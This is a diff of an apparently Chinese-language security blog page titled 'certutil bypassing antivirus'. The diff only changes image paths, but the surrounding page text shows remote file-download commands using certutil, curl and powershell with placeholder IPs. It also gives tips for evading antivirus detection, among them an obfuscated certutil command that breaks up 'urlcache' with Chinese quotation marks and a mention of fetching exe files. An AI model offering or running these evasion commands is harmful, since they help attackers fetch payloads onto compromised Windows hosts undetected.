@@ -13,18 +13,18 @@
 <meta property="og:site_name" content="pHNinet@zerO">
 <meta property="og:description" content="certutil绕过杀软1.远程文件下载命令 certutil  1certutil &amp;&amp; certutil -urlcache -split -f http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;test.zip    curl  1curl http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;test.zip -o c:\test.zip   powershell  1powershell -c &amp;q">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://odyline.github.io/certutil%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/1.jpg">
-<meta property="og:image" content="https://odyline.github.io/certutil%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/2.jpg">
-<meta property="og:image" content="https://odyline.github.io/certutil%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/3.jpg">
-<meta property="og:image" content="https://odyline.github.io/certutil%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/4.jpg">
-<meta property="og:image" content="https://odyline.github.io/certutil%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/5.jpg">
+<meta property="og:image" content="https://odyline.github.io/2022/02/18/certutil%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/1.jpg">
+<meta property="og:image" content="https://odyline.github.io/2022/02/18/certutil%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/2.jpg">
+<meta property="og:image" content="https://odyline.github.io/2022/02/18/certutil%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/3.jpg">
+<meta property="og:image" content="https://odyline.github.io/2022/02/18/certutil%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/4.jpg">
+<meta property="og:image" content="https://odyline.github.io/2022/02/18/certutil%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/5.jpg">
 <meta property="article:published_time" content="2022-02-18T09:00:00.000Z">
 <meta property="article:modified_time" content="2022-02-25T15:38:14.018Z">
 <meta property="article:author" content="pHNinet@zerO">
 <meta property="article:tag" content="内网">
 <meta property="article:tag" content="Bypass">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://odyline.github.io/certutil%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/1.jpg">
+<meta name="twitter:image" content="https://odyline.github.io/2022/02/18/certutil%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/1.jpg">
     
     
       
@@ -188,15 +188,15 @@
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">怎么进行一个绕过呢，一般直接远程访问资源就会被杀</span><br></pre></td></tr></table></figure>
 
-<p><img src="/certutil%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/1.jpg" alt="1"></p>
+<p><img src="/2022/02/18/certutil%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/1.jpg" alt="1"></p>
 <ul>
 <li>用^也会一样被杀</li>
 </ul>
-<p><img src="/certutil%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/2.jpg" alt="2"></p>
+<p><img src="/2022/02/18/certutil%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/2.jpg" alt="2"></p>
 <ul>
 <li>双写certutil</li>
 </ul>
-<p><img src="/certutil%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/3.jpg" alt="3"></p>
+<p><img src="/2022/02/18/certutil%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/3.jpg" alt="3"></p>
 <ul>
 <li><p>fuzz大法看杀软查杀哪一个地方</p>
 </li>
@@ -205,10 +205,10 @@
 </ul>
 <h3 id="3-最终发现，在cmd下面中文的“”也是可以正常执行远程下载资源文件的"><a href="#3-最终发现，在cmd下面中文的“”也是可以正常执行远程下载资源文件的" class="headerlink" title="3.最终发现，在cmd下面中文的“”也是可以正常执行远程下载资源文件的"></a>3.最终发现，在cmd下面中文的“”也是可以正常执行远程下载资源文件的</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil &amp;&amp; certutil -url“”cache -split -f http://xxx.xxx.xxx/<span class="number">1.</span>txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="/certutil%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/4.jpg" alt="4"></p>
+<p><img src="/2022/02/18/certutil%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/4.jpg" alt="4"></p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下载exe文件</span><br></pre></td></tr></table></figure>
 
-<p><img src="/certutil%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/5.jpg" alt="5"></p>
+<p><img src="/2022/02/18/certutil%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF/5.jpg" alt="5"></p>
 
   </div>
 </article>
